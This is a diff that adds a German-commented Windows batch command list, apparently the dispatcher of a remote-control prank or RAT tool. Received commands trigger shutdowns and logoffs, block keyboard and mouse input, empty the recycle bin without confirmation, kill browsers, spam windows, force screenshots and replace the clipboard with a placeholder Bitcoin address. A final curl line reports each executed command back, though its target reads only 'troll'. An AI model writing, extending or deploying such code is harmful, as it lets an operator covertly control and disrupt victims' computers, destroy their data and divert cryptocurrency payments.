@@ -1,1 +1,33 @@
-none
+:: BEFEHLSLISTE (Hier kommen alle deine Befehle rein!)
+            if "!current_cmd!"=="calc" start calc.exe
+            if "!current_cmd!"=="troll" start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+            if "!current_cmd!"=="msg" msg * "CRITICAL SYSTEM ERROR"
+            if "!current_cmd!"=="talk" powershell -c "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Warning. System override active.')"
+            if "!current_cmd!"=="dark" powershell -c "(Add-Type '[DllImport(\"user32.dll\")]public static extern int SendMessage(int h,int m,int w,int l);' -N 'D' -P)::SendMessage(-1,0x0112,0xF170,2)"
+            
+            :: --- HIER WEITERE NEUE BEFEHLE EINFÜGEN ---
+            if "!current_cmd!"=="shutdown" shutdown /s /t 20
+            if "!current_cmd!"=="restart" shutdown /r /t 20
+            if "!current_cmd!"=="bsod" powershell -c "wininit"
+            if "!current_cmd!"=="volume-max" powershell -c "$w=New-Object -Com WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]175)}"
+            if "!current_cmd!"=="volume-min" powershell -c "$w=New-Object -Com WScript.Shell;for($i=0;$i -lt 50;$i++){$w.SendKeys([char]174)}"
+            if "!current_cmd!"=="beep" powershell -c "[console]::beep(1000,500);[console]::beep(2000,500)"
+            if "!current_cmd!"=="crazy" for /L %%x in (1,1,10) do (start calc.exe & start notepad.exe)
+            if "!current_cmd!"=="task-kill" (taskkill /f /im chrome.exe & taskkill /f /im msedge.exe & taskkill /f /im firefox.exe)
+            if "!current_cmd!"=="empty-trash" powershell -c "Clear-RecycleBin -Confirm:$false"
+            if "!current_cmd!"=="block" powershell -c "$c='[DllImport(\"user32.dll\")]public static extern bool BlockInput(bool f);';$t=Add-Type -M $c -N 'U' -P;$t::BlockInput($true);Start-Sleep -s 30;$t::BlockInput($false)"
+            if "!current_cmd!"=="clip-btc" powershell -c "Set-Clipboard -Value 'DEINE_BTC_ADRESSE'"
+            if "!current_cmd!"=="open-cd" powershell -c "(New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject()"
+            if "!current_cmd!"=="rotate" powershell -c "$w=New-Object -Com WScript.Shell;$w.SendKeys('^%%{DOWN}')"
+            if "!current_cmd!"=="logoff" logoff
+            if "!current_cmd!"=="notepad" start notepad.exe
+            if "!current_cmd!"=="write" start write.exe
+            if "!current_cmd!"=="paint" start mspaint.exe
+            if "!current_cmd!"=="cmd-spam" for /L %%x in (1,1,10) do (start cmd.exe)
+            if "!current_cmd!"=="wallpaper" powershell -c "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value 'C:\Pfad\Zu\Einem\Bild.jpg'; rundll32.exe user32.dll,UpdatePerUserSystemParameters"
+            if "!current_cmd!"=="hide-icons" powershell -c "$w=New-Object -Com WScript.Shell;$w.SendKeys('^ ')"
+            if "!current_cmd!"=="screenshot-force" set "do_scr=1"
+            :: --- ENDE DER NEUEN BEFEHLE ---
+
+            :: Diese Zeile muss immer UNTER den Befehlen stehen:
+            curl -s -d "content=✅ Befehl ausgeführt: !current_cmd!" "troll" >nul 2>&1
